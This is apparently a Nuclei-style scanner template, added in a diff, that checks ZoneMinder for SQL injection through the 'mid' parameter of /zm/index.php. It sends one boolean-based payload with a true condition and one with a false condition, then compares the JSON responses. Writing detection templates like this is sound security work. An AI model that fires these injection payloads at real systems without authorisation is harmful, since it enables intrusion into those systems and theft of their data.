@@ -1,0 +1,48 @@
+id: poc-yaml-zoneminder-zm-index-mid-sqli
+info:
+  name: ZoneMinder mid SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    ZoneMinder is vulnerable to SQL injection via the "mid" parameter in requests to /zm/index.php.
+
+http:
+  - raw:
+      - |
+        GET /zm/index.php?limit=20&mid=-1%20OR%203*2*1=6%20AND%20000322=000323&order=desc&request=watch&sort=Id&view=request HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"result":"Ok"'
+          - '"rows":[]'
+
+  - raw:
+      - |
+        GET /zm/index.php?limit=20&mid=-1%20OR%203*2*1=6%20AND%20000322=000322&order=desc&request=watch&sort=Id&view=request HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"result":"Ok"'
+          - '"rows":[{"Id"'
+          - 'MonitorId'
+          - 'StorageId'
+          - 'imgHtml'
+      - type: word
+        part: header
+        words:
+          - 'application/json'
